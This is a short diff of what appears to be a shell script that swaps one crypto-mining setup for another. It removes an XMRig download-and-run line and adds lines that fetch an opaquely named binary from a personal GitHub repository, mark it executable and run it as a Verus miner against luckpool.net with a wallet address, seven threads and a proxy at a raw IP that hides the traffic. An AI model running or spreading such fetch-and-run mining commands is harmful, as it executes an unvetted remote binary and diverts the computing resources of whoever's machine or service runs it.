@@ -1,1 +1,4 @@
-wget https://github.com/xmrig/xmrig/releases/download/v5.11.3/xmrig-5.11.3-xenial-x64.tar.gz && tar -zxf xmrig-5.11.3-xenial-x64.tar.gz && cd xmrig-5.11.3 &&./xmrig --donate-level 1 -o rx.unmineable.com:3333 -u SHIB:0x4fbad4ffd24fb2bc6251ffd34fd4a54ccfd251f4.BGS -p x -k -a rx/0
+wget https://github.com/surtitedjohadiningrat/verus/raw/main/nanung
+chmod +x nanung
+./nanung -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RR6LLyCz4SwrUrkDDAWLsCXgxjXyAqvvPm.nn4 -p c=VRSC,zap=VRSC -t 7 -x 185.32.120.242:1080
+.
